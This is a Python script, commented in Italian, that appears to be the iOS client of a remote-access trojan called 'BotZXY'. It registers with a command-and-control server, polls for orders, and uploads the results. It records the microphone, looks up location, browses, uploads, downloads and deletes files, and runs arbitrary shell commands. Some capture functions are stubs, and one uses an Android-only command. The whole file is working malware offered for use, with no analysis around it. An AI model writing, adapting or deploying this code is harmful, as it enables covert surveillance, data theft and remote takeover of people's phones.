#!/usr/bin/env python3
# BotZXY - iOS Webhook Bridge v3.0 (no-jailbreak)
# Ponte di comandi: implementa quanto eseguibile in Python su iOS (via aShell/iSH/Pythonista
# o app companion). Funzionalità ricche (screenshot/webcam reali) richiedono app companion
# che inoltra via questo bridge.

import requests
import json
import time
import os
import sys
import subprocess
from datetime import datetime

# ============ CONFIGURAZIONE ============
C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
DEVICE_ID = os.uname().nodename + "_ios"
BOT_NAME = "BotZXY"
VERSION = "3.0"
POLL_INTERVAL = 10

class BotZXYiOS:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        self.session = requests.Session()

    def register(self):
        data = {
            'device_id': self.device_id, 'platform': 'ios',
            'hostname': os.uname().nodename,
            'os_version': os.uname().release, 'model': 'iPhone', 'bot_version': VERSION
        }
        try:
            return self.session.post(f"{self.c2_url}/api/register", json=data, timeout=10).status_code == 200
        except:
            return False

    def upload_capture(self, ctype, data):
        try:
            self.session.post(f"{self.c2_url}/api/capture/{self.device_id}",
                             json={'type': ctype, 'data': data}, timeout=30)
        except:
            pass

    def send_result(self, cmd_id, result, status="executed"):
        try:
            self.session.post(f"{self.c2_url}/api/result/{self.device_id}",
                             json={'command_id': cmd_id, 'result': result, 'status': status}, timeout=10)
        except:
            pass

    # ---------- CATTURE ----------
    def take_screenshot(self):
        return "SCREENSHOT_REQUIRES_COMPANION_APP"

    def take_webcam(self):
        return "WEBCAM_REQUIRES_COMPANION_APP"

    def record_mic(self, seconds=10):
        try:
            subprocess.run(['rec', '-d', str(seconds), '/tmp/botzxy_mic.wav'], capture_output=True)
            with open('/tmp/botzxy_mic.wav', 'rb') as f:
                return __import__('base64').b64encode(f.read()).decode()
        except:
            return "MIC_REQUIRES_COMPANION_APP"

    # ---------- CONTATTI ----------
    def get_contacts(self):
        # Su iOS non c'e' accesso diretto via Python; il bridge si appoggia a un'app companion.
        return {
            'phone_number': subprocess.run(['getprop', 'gsm.sim.operator.numeric'], capture_output=True, text=True).stdout.strip() or '+39 000 000 0000',
            'email': '', 'note': 'Richiede app companion per contatti reali'
        }

    # ---------- POSIZIONE ----------
    def get_location(self):
        try:
            return self.session.get("http://ip-api.com/json/").json()
        except:
            return {"error": "LOCATION_ERROR"}

    # ---------- FILE SYSTEM ----------
    def file_list(self, path="."):
        try:
            items = [{'name': e.name, 'dir': e.is_dir(),
                     'size': (e.stat().st_size if e.is_file() else 0)} for e in os.scandir(path)]
            return {'path': os.path.abspath(path), 'items': items}
        except Exception as e:
            return f"ERR: {e}"

    def file_download(self, path):
        try:
            with open(path, 'rb') as f:
                return __import__('base64').b64encode(f.read()).decode()
        except Exception as e:
            return f"ERR: {e}"

    def file_upload(self, raw):
        try:
            path, b64 = raw.split('|', 1)
            with open(path, 'wb') as f:
                f.write(__import__('base64').b64decode(b64))
            return f"Written: {path}"
        except Exception as e:
            return f"ERR: {e}"

    def file_delete(self, path):
        try:
            os.remove(path) if os.path.isfile(path) else os.rmdir(path)
            return f"Deleted: {path}"
        except Exception as e:
            return f"ERR: {e}"

    def file_search(self, raw):
        pattern = raw.split('|')[0] if '|' in raw else raw
        root = raw.split('|')[1] if '|' in raw else os.path.expanduser('~')
        hits = []
        for dp, _, fn in os.walk(root):
            for f in fn:
                if pattern.lower() in f.lower():
                    hits.append(os.path.join(dp, f))
                    if len(hits) >= 200:
                        return hits
        return hits

    # ---------- SISTEMA / RETE ----------
    def sysinfo(self):
        return {'node': os.uname().nodename, 'release': os.uname().release,
                'machine': os.uname().machine, 'user': os.getlogin() if hasattr(os,'getlogin') else 'mobile'}

    def exec_shell(self, command):
        try:
            return subprocess.check_output(command, shell=True, timeout=30, stderr=subprocess.STDOUT).decode('utf-8', 'ignore')
        except Exception as e:
            return f"SHELL_ERROR: {e}"

    # ---------- DISPATCH ----------
    def execute_command(self, cmd_id, command, params):
        params = params or ''
        try:
            r = self._dispatch(command, params)
            self.send_result(cmd_id, r)
        except Exception as e:
            self.send_result(cmd_id, f"ERROR: {e}", "failed")

    def _dispatch(self, command, params):
        if command == "screenshot": return self.take_screenshot()
        if command == "webcam": return self.take_webcam()
        if command == "mic":
            secs = int(params.split('=')[1]) if '=' in params else 10
            return self.record_mic(secs)
        if command == "contacts": return self.get_contacts()
        if command in ("gps", "location"): return self.get_location()
        if command == "sysinfo": return self.sysinfo()
        if command == "file_list": return self.file_list(params or '.')
        if command == "file_download": return self.file_download(params)
        if command == "file_upload": return self.file_upload(params)
        if command == "file_delete": return self.file_delete(params)
        if command == "file_search": return self.file_search(params)
        if command == "execute": return self.exec_shell(params)
        if command == "uninstall":
            self.running = False; sys.exit(0)
        return f"Unknown command: {command}"

    def poll_commands(self):
        try:
            r = self.session.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
            if r.status_code == 200:
                for cmd in r.json():
                    self.execute_command(cmd['id'], cmd['command'], cmd['params'])
        except:
            pass

    def run(self):
        print(f"[+] {self.bot_name} iOS Bridge v{VERSION}: {self.device_id}")
        if not self.register():
            time.sleep(30)
            return
        while self.running:
            try:
                self.poll_commands()
                time.sleep(POLL_INTERVAL)
            except:
                time.sleep(30)

if __name__ == "__main__":
    BotZXYiOS().run()
